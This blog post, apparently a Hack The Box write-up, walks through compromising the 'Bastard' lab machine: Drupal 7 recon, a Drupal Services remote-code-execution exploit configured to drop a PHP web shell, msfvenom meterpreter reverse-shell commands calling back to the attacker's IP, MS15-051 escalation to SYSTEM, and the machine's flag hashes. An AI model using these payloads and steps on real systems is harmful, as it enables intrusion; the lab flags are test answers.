---
layout: post
title:  "HTB Bastard Linux"
description : 
tags: 
---

# HTB Bastard

# Recon
Nmap scan
```ruby
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_ Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Gobuster scan
![](https://lh3.googleusercontent.com/GaFlr7GWx5N7rb7y2-vSaXl_qOI3ZlnZrAanwKRIkyniOkkaPB2zGRrVrG2JCO5ef38R_C0CnDbchWt-apnuXRWa6JEX43MtH0IvRhLIICiY2Yz_LcjCeE1ZnnQCSRSjl4Hc3ZX76PtwazQFq3377eGVr-TD06s88fSMjZMZTrM01J_S_VOIZsrVIP1rR_qDF34KbkzZjV0mww7GSNzuOKLxicLKkmsZo4UiTr8XTi3jC7upES-QnHrkSjC9V-3tdnZJ5oUO2hPrS4yjWwMLXAzlNJBZVlJd05wk_-ssaU-2of4lywP8s6kTa2uhDun4MK2oR7eGRXxgdGU8XEvDR_YHZfJV6xqXkkkyjduHiCXiO-rbt0US7Bd76cjx9n1ah2eiBy5mIhcFxh-FVuBz3sWzDLLInO5fFPT-jtcdU5yKk4B2UKTeAMq2uc3HboccrLshIXwCBCA494rnHStO67WjSz4JR9UKgiFasZpvxi_QZ9ddHvdKnn4Ze1_GN43TOoMaLurneVuGh2o6tVv_nguB1bCUWuLjJQVB9mtJNKp0jgUwDt-cnZvuofL5PnVYnNcM_Zz8eoEmhJIHkIwUSUqX7GFNOjj76p9Dqi4QX6yH0i3u6OJ3Qu05PgP1i_ama4KnjsDVaGp5N-yWOa3XDX1pR9RzdeZ6T5cCdrOf5YoES9N4MtR_QPo=w368-h255-no)

Nmap indicates that a Drupal 7 is running on port:80. Furterh investigation reveals the changelot file.
![](https://lh3.googleusercontent.com/Yeesj-3PsnWGJ_xqpyM1XGCwZ_sxMTtcLND1FYB4hJr2EsoknRs7cEGX4mD8BU9y70P44iC1BDqPeSOZz59_YUN2neCFoSpEjlxA5LJdY224klUO0E_Yr48EhtNAvc_dofSeiAqxWzDp7FFlrAlJziRXmEwYqZzlqCULm_c6R7zgdQuj4qs2k97ifJr7aGZ0HSXqOh2FLsCAc9Qp4OtZZ9H_f_FL6AI9_307z9Cjz9bveC-nC2Ic2kMQpL_SrMcXxz5JGIke8eHnAdATOazx-P54PSPMnkY8Lk5FXJESnCvtaoPLh_H8AVDB-iTjKLBkl3xf92AsYgeygCTTcVs01-Kv-9AFHoWIh9gdAQ3uaPJY2xCyH4ol7qF64bzoMT-jA4ih5UB3R11-Wm7yVfbgXRWXqInf39C75csOZPFi5-_Tm4Ogv_sA-rLvmxnBVpToU3-6LyCy1W9Zpt1k7sBC1cg_gpcsi5ZOa5seIPW5gFmIHRlI9ZAUZW1fNpD7ZK4HPXy2_8PsHOVVUjeUFmfJcOhD0eTufwooyblwEGaWAFe0IOo9xrmm_Cd591cDIrlBAbpZq9fvmhpn2xwtiPjpO7X1H35SI7hklPPbh6bOuS8YGI6zrR2EXfvaKbDegmSf_KqQ83RjWmuPG_KjLSdUxGIi3d2w53iOfCSa-Etf7le7NGHzc8zEk7Q=w532-h266-no)

![](https://lh3.googleusercontent.com/VB7NUY3pt-vYtFz15oSnfHz9B5ShufrG73oMbDS-RdBhPVVr1Ob3gqv28Fy-69TgcNx0_6v67Zv3N9MMWtkLgT2i96YJsSdYrdhNDTE5NsV5ttkL-vUP6DGSx9SZuynkc4MHlY3DP-tG8efdqQv_D7YVCpIR157_XlH1vSkUIHGa3dVGAhYaUCh0FWWMNf_ZOaFyy-xiqL0OE_Ryz4O_-TpdAW1THvcNDLeoWVsDiDRq2j0cRzEyFJnB0tv_-Yfwhf8EkQIhxdKBBse7pITTJjZdDi1dJZ18Y0PB_VFyhWHtY4gpZKgGmzxo5rylV3yuT_mfOyQOltidwtb6Dts9pq_Yc0kZD1Xod2GKG6jBWh6x4T27qSr16MZDrdzqJ2xrtykv56tjhS1qz5Ae18XLf4yObNz-TQNH3QQ8p_WifeAhYQXEHdTk_Xrlgib7SOl04UTOpwu_lpUXII_SOU_keQKGLew32jY5aq8Gu3pRS8Ctk68c_FwYhXAzQSVt7PRumDuo1X3o5dQ1OMV5rKwgf6Fxplml6Ba0zpu624RJpi2Y3qXsDLKrllTnRpfOv2Ok7KorvuwnLuzFdDc-FXn-8d92MZ10clLoCSKJ1b5tqIyVFg3J6wY8eou5x-Kb1CeR9HSUNDS6BxrxWztuJ-GN_GOKzOqdb9axwIZND-5d-Zyr9OF4G5EEK2M=w559-h331-no)

# Exploitation
According to the changelog file the Drupal version running is 7.58. After a quick search we find
the closes exploit to the version
```shell
Drupal 7.x Module Services - Remote Code Execution | exploits/php/webapps/41564.php
```
![](https://lh3.googleusercontent.com/9lstBWfm8oaDaKy99l1tD8hJOq_d64IGWmu0a4RgeDtp7DJC-6L0xrzmUCx4URVSFJVnkEgZt6xb8QaTfECurCQUgF8vl-xpwfbgPDm_1n_qjW32P7S7iPkPnEWSMy_gSi6n06Di84Rm75syJ3P0lKovRketWxPvVCwudFYoqSZ5TcCn9u8VyMTU_likTOOElJCuJyjRw3CWlp02WNcOXAeL1qwGx_HT_36jfM7ji6wsfRZIHbLBIbLjZEdG5rWbXy9HCyi__RnOBIposVdcDHcQPV6by9h1vM1E4kA4YpYLrc5iiKXLHSaFe4rzlzRTzUlzQbb3GnHewuj2GDMeGaflG8TC4WXekLQofJ6b_Hklxk5stM-MUtympGNC-CvmFVmvcOEiGxBOACTlAB42RBmNM06HU3iEuWFb5Q_NAJ5_jAkQhBnAT-pNcfWR4-YOzqbxC2lbYVie3-_qvR-nehojWX2hpvjlTI8VvRb5VTXTaXjUr851icRrIJkLn5dRCJICEcI1J8RaGWiiDufxaiaC1EhgdlnXu8arpv9o8cekjspbkRyHdD2dLcN2WTFg5iEEjqT3yeBDSh577Hng1NQvXruBpUEgRY7uiSDMrZ2HsN_6irXpOyGCvKxYkLq6Jlqhi3GD6fFB-L5s4XfWFiUxqVZVBykE9UyYrxGsoDEwBM95AhFdGdU=w676-h275-no)

We modified the following options:
```shell
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';
$file = [
 'filename' => 'dixuSOspsOUU.php',
 'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
```
```shell
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';
$file = [
 'filename' => 'writeup.php',
 'data' => '<?php echo system($_GET["cmd"]); ?>'
```
We run the ./drupal.php file and it will create to two files **session.json** and **user.json**
![](https://lh3.googleusercontent.com/SMmshWsrne-XpcHuJoxK1KD2lR89U3wxk_O8VI1BVhfnHl5B-kkwkJ9W51xAYVSwi-wxJU65zXKOzF8w98NVmaRh-XxKUvkr0etYIiYnuG1W9bm3VBqOJd-V9YKsr0Bcevrqy7PRTNoYMAma6HWEOI8P_5q1fBARKUm4Ex59Yh5v2R2G4R3pLzNna55Gz-3CH24oI1xS5ykm4RMN9biEE96IPvFmdIYm2wzm-BON4_cOJTZvqrnPSU6v-63z4HN6R5ogLLob9kL2AYUb8gmrpKXU_W1-VJqkRGhxxY5dnO6JMGjyDp-fX0LjrFe-daIIl8O1yMkD-bqujqYSQYMb1xvB8ODxEgWGm-VTJ6RuxLVUM3CyGJpULFFUWQGeAaqmWXiWawlQNcS0Upg9sZfJhQclbyAsDnjVF69kbcRlFqIKdpJJjrCAPAHQ7urTQrDfSas0vk-iCf9i-_WtL44g2Bylz1ZZXlG860bTGeTFCQt_IVOOeROvNBCzx9NpKgqvKoJxZTH54iNTnWdQ0FiZfes5WEvc7iweOW1iC4W0Y_FNj3BaJQ8BBnlpqt7RBf0YlL8ehQwU6GJkHfPlDGOlBDtL8qKX1ndZ-JQnZlzW14QCdsLD8CmTGVrRpJnSZziHBBp0UBjktwZbtWre_4ByvtJSdq6Vh4Nm4DlcN_8uiHa0LSXKEFKSOpg=w390-h199-no)

![](https://lh3.googleusercontent.com/5LEVJvjFIrM7Tiw-TidUiLTpx5E00I4SLhHmbXCtiMhYgZNPmnsjwCpU6rAYu7-s64eiA9J1LActK24HINMLsgSV_3lJLo6rSSK--VJsEfTK4cxVOfPX3IKbIEZbNBZPKYRgBgoSUiaie3rft6FZGAR-2XzEQcATrYp3-ExRW5Q3Kejw9_RLHCNc6zW7xGXpx06Fvr_u04hiOmFX_M0X4Md7k6l_OI3HV0h0vHS1vVQpiE5Pea38ftmwWkhJPtGCnB9IIJn7TzChcc4wFRz-m4RjS8oU2lQkRIFn-ihtu6nD2tLzhAUMXQJZMq8WY5z3n0XuNiiV3wwSk-WUdDfmR5CCLvGUcmi-lQMG2PkWydQnvVQ9jdMG5SlTbfoVrc8gxgBrJuwu8YSn4zqApPw3sJYdiaFWFNvyoCgOYqYvDdCw4JdQc2tl5KcGmhd7KyfZ1hzIYYsmpM1sc7jcr783PnswhV30MhFthhd6adUYjWoh0sTmLxOUckcXYEx1ss3c2n-UqIKo7Lx-wfeOw3EbK5fZuSsPo-dm-E-yP1kr9ayb90FpK-4Q2kaar9MLJnllC3UOmvm4Unwn0crlb0BKTlFeocXxFRdqqDQj1zvweT_k7hTRt1RzeIOFninvBgjTbYRXENeCD5pVQr_Z5md9FnkNkZSnXKHq83RN3JbqKB2Kbuaph3Nj9sk=w584-h128-no)

We create a cookie with cookie manager and we use the session ID and session name from the
session.json file and we login as admin.
![](https://lh3.googleusercontent.com/FWdpEek-l4QGWD21HrN386secGE9IxiA_OVvGwEOH7A7JxrdeJRyKv_kxLrxlCCSYmTtR-udboRR6QK9LcJNys4vQclROwHpkAFIprI_g3z1Pn275JSQf6PkYjNwpciUfktV5Iq5msSUnQdqJIBWNJeA1GOs8L9yE-DgqlxgxoRMO6x5EJK9ZVbp1TcwndqBnqvdy3tIweC8wu2THJz7z_vvQLv7uy-dsjl3z_L0HIYXQB4vS8eNEisp22CnIjHuAMlBEIcgCba2EkRJwEOEfzCw0V4P-T0OqSyo6J3N7h5OVdCtJaJHvMeM_Xzd1A53CkeNShdDDc05umpafeRMJKqzdcDuUhc8790jOy1IDfZ1ILSVFA531KC3KjKP9lo8lMUXCsho-0Pf2B_snSkYXzA0BHkY4qKZJN4-Pdj6yWDXoeyWUKX6w3hCDJgRyUx6A7JwWq4TNVUlRobXrO-fCQrvKZPnBi6KHSnQZ27-9qQ1TAewuUYdcz9EktLnAKPNI6zu4HThNwp4VK_gcbzFVmXwZQU1k7KJ8foN0ZtWKhrf2n389avKxu0d643lyffXz1SvMGHG4rQQ2H8WcJCVzw01nfBVzPPaDE3qzD-5e9kPpNtOIZmcN17Avhj0r49ycan7cZ_RFx__mHX96v4TeaABukXl5nGs8gZeaEXxwc3cjcvO1V5JaeA=w986-h386-no)


On the modules section we enable the **PHP Filter*
![](https://lh3.googleusercontent.com/nqxJ_UNATvG5iBxalGd0kLEojyGOwa973A2M-zjq9lLStWqZzAMxlMbIO11VoDh8NDS8K88fzg-3LDnwFoVo-9P5fMTT80Z-7E6UfgMv0TfW4mm4CCJt_YOMXKpeQ_lXuh45zYpgZiiEcFAwPIphzDOJAC_si-jnqQVdMFBLOv8HksG-nYkEmqnO6F3oTch7bCNtJTBXp6GhI8SA5jeBqmi_kLJIoG4xDT1dlSQeTUTaLL5rLlId66_FILtoo9UZmWuR-N62UkhiceB_cE_u6gLPr5fO84E1yh7v-jkSmg2nSlk9Zhy7bJ2qgY2i7EA0D0tEcXPFgF7LXCoqZUa-CDOY4KMave_YxmbpBe13MMwnMqTaKhwVOE-EmoNiXmRC1Y-sF-CHozmwnMJyHdTQB-H6vi8Akrhe6wVh55ttNbElM8Oa3P4KOuDotdxSOAT9GsofZsIgsFXnM7TEUBRE9xW-G_pHgZD22lEhjJn8XZsxqjx8IR4z_aGv06-w3r96TK3xb0cclh41hh4IIWp7sIvvAEt2-F1dZefou00iPTPeaNccDlscnljL1xxCBg1evMnjz9eUybJ8VYArv-kPaOMQM0qzWAav3W6A693qGe2om9omIIIyJLx7BJ7_pGGMLuQ6NWV-iL7B0u2eu5y4COVATCqElmWvx3gn6YmMJ0JrgvE7mW9hZjE=w843-h93-no)


We create a php msfvenom shell and we execute it to get a reverse shell
```shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=9999 -e base64 -f raw > evil.php
```
![](https://lh3.googleusercontent.com/QGc0fa1RgZl9a6ns8wJpGesn-jZrLbiQmAF5aVath8_4EWgBLoexsuW3AOsYyA24htM-9DZFNHmmbffO7XZL4JeD1LrY7Z1fVnJ6euJFbxSeYv5W0ZkPAdBKEPR9Y2WewjzgjWaQmjAjm-J8UA9-Lx5VIBQc3p8ycsmHIdBZl_dUOgBscp6UOaa8otyC7AoWaXajuYjsbrH8KRTGrSKogCVODNmHG03xMDq5MFihoOxipaeAAdd-T3sV8qce-Gl91gaJw5JiWgEFi_R_TwmkgBR8vzYxlpEV87SQsgTciG-5bAuzxmHLmYsl9LIkmpgLNqPYfyITNkQTTXM7Xh6mFTGUQz6L07L6htETxdwuHN8MsaguMbEnu-0nN4FK25BVbfven75Awd2wayESjrj-edDhbAv3Px8qx6DTf3Ydx5_nGsBG_MIMAV1QC9AyFkcVNodlgJhB-oBfNbNKKv_ZmzJzN7re0-a_Rxp3Fq5lBfy92xqA3OG8xWioV63UkOH5fy3MAb--8VEqewtKM6lLDb6f8GCn76pSGmeTbKQOQM7HotuEYrKc8VWT68Rkb5WCTg6QuIkiZz123HbTKnTreMZw4ZOG9yZ9u7_eGgLe7qLPHTLloVU1P6yrNQqXkcIFedEEHPlc4EnjwtVsS7_WM-eClbmhK_t8q2yxa2ydvQETpP80dxkByhg=w1126-h179-no)

![](https://lh3.googleusercontent.com/VFHh7am3Klejtbn_HPd3Dv74BW-29ig73ZdRcCpzmZ5k7dikSE1e_3C-2mjrw6oudAxyxLkSPygKbVu8UZnIBAViqtvhpNC2IcQpr0i7zbJeCGKxZRwQi_Q2Jxjwgb4BMeOtZYsp3ZLQ0yPBlOmHWgW-QdrTHM2slDp01O06kZPdXWTIJP5xDamD0i6pEL5_cewVqB9TIvAsvyPauxQtTTaLRFDvg5JpBCz3sJx-aFh5wmq6ihGNFqH4WKf4OWZMkwh-jr2MtfbkqepsIayHTfB_rnOENyJWn0J3B4BMvz2VRyj0PKv8R3VZrIUcBWvLI6zxlzL8AakevTC9887WeKWeU8mrpqHvlPdi3hi89EF-H1HBDRU7H7mMEg8emDVQqwKc6E4e1LQcc9fJJwQ_TIIJaGmvPXHUbPXiUqMMT0eYW_Rgnlji1u_WrZoUB2Wv5DX7SJlgTxS3yA6yLFOvGjwbRyTDj3i-pZ8a-WIDl-nT-gzZDnzZL47JuvTSxATsgzgce1HJLIBaVNiLsdfBvSYtappbyHVL5Eq2h2zlOez7sPcbKPIr5UqngokTd4TAeYkhfyGjPA89RX04DNxZtFf-gQ7QcgRmBlXqdVoYfD7v10gAomRGP_y4_FTxiGcRw_L0Izzc7g6-Ofo_9v-illxW5JFMNhiEgfXycxUCJAkXaf7m33lgImU=w492-h156-no) 

![](https://lh3.googleusercontent.com/S5sXZe0Qh6mCkJsuKAr8IKe0ZMv9Ib8mOq8Cnkl0q2wDr82kybgdB1XgYv8F8C7Gu99PAN7H4JeQ6Wfax1xz1SJCwXxC7XfLfVhNkvXjthI4Z4mh4JftqdnpBp6sDWqb_yUfkhMnwkxjqf-B35SUJERjWbJYyosWpWtNJEnZ9Srpb9cLs6L9DLKc2YPR5jqpqe2xKDuXC5Y3bG8ZpGb_1qJZYBS31nUp8mhmhw12uh2w_N2z7aiRFbCP8-Ur3FeQVNwH3HO-6aacVwep0okgEQi9qhKrcNyEmfGSO-gZvQQcENqvoqA-Z08FtV23RA7nWEFdxFpJ6lLi-8e5yi5KOgvh-7oG-QINPJsQ8Mwvsdr3T_sQ7D6OVQe25Dc0c47oSIE8lHMuUKnhsqq0AAmW0GdiUvJFnn6sv5WczHU2aq9dpjWxX5gjYnKB6C1AL8nkU6sIArF6T-9kztigFgU-LottydzOnoA3qMojJbenpnjLmw9cphIXqK-f-eZ28Uj92ayyVrR3DjWrlZMjteyo5Ex-S-tHZtSpKuv2h-fuUgEztz5Y2kTKLWrsdTgdqRevODdNQaEKdEbMoqvXYvBrwPFnz6Jx2nj8rFo_MZgW1C2OPbjNyszwGqtYwJYE1X8qmb-8AccySIo3K64MWeK-J9oEA6Wt4QkiXGPnSk4K2IJ1NFcmFjiZcFY=w446-h145-no)

However, shell is very limited and it crash when we try to spawn a windows shell. so we create another
msfvenom shell
but this time a windows/x64 as the target machine is a 64bit. and we upload it using the current php
shell
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=5555 -f exe > evil64.exe
```
# Privilege Escalation
We use the vuln: MS15-051 CVE-2015-1701
This exploit let us pass commands as system authority, so by passin the command "cmd" we get system
priv. Ex
```ruby
2/2
C:\inetpub\drupal-7.54>exploit-bastard.exe whoami
exploit-bastard.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1500 created.
==============================
nt authority\system
C:\inetpub\drupal-7.54>exploit-bastard.exe cmd
exploit-bastard.exe cmd
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2588 created.
==============================
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```
```ruby
ROOT  "4bf12b963da1b30cc93496f617f7ba7c" 
USER  "ba22fde1932d06eb76a163d312f921a2" 
```